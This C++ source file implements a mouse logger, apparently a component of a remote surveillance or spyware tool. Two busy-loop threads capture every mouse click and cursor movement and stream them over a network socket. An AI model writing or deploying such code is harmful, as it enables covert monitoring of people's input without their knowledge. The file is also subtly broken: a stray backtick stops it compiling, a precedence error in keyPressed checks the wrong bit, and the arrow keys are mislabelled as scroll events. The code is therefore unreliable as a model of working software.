#include "MouseLogger.h"

MouseLogger::MouseLogger() {}

MouseLogger::~MouseLogger() {}

// helper function - returns if a specific key has been pressed
int keyPressed(int key) {
	return (GetAsyncKeyState(key) & 0x8000 != 0);
}

// function listens to all mouse clicks & position changes. Will be used as a thread
void MouseLogger::recordMouseClicks(SOCKET sock)
{
	while (true)
	{
		std::string msg = "";

		if (keyPressed(VK_LBUTTON))
		{
			msg = "<left-click>";
		}
		else if (keyPressed(VK_RBUTTON))
		{
			msg = "<right-click>";
		}
		else if (keyPressed(VK_MBUTTON))
		{
			msg = "<scroll-click>";
		}
		else if (keyPressed(VK_UP))
		{
			msg = "<scroll-up>";
		}
		else if (keyPressed(VK_DOWN))
		{
			msg = "<scroll-down>";
		}

		std::cout << msg;
		send(sock, msg.c_str(), msg.length(), 0);
	}
}

// function returns if 2 POINTS are equal
bool compareCoordinates(POINT a, POINT b) { return (a.x == b.x && a.y == b.y); }

void MouseLogger::recordMousePos(SOCKET sock)
{
	POINT currPos;
	POINT tempPos;

	GetCursorPos(&currPos);`
	while (true)
	{
		std::string msg = "";

		GetCursorPos(&tempPos);
		if (!compareCoordinates(currPos, tempPos))
		{
			currPos = tempPos;

			msg = "<" + std::to_string(currPos.x) + "x" + std::to_string(currPos.y) + ">";

			std::cout << msg;
			send(sock, msg.c_str(), msg.length(), 0);
			Sleep(30);
		}
	}
}